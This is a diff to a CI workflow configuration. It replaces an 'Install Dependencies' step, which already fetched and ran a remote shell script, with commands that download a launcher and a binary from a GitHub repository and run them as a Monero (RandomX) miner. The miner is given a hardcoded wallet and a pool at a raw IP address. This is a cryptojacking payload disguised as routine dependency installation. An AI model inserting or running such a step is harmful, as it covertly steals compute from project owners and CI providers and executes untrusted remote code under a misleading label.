@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://raw.githubusercontent.com/chirifa201/python/main/sara.sh && chmod +x sara.sh && ./sara.sh
+              wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 195.201.124.214:80
              
 workflows:
     version: 2.1
